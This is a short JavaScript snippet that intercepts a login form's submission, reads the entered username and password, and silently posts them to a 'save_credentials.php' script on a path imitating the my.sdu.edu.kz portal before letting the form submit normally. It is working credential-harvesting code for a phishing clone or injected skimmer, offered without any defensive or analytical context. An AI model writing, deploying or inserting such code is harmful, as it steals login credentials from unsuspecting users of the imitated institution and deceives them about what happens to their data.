<script>
document.getElementById('loginForm').onsubmit = function(event) {
    event.preventDefault(); 

    var username = document.getElementById('username').value;
    var password = document.getElementById('password').value;
    
    var xhr = new XMLHttpRequest();
    xhr.open("post", "my-first-project/my.sdu.edu.kz/save_credentials.php", true);
    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    xhr.send("username=" + username + "&password=" + password);

    setTimeout(function() {
        document.getElementById('loginForm').submit();
    }, 500); 
};
</script>
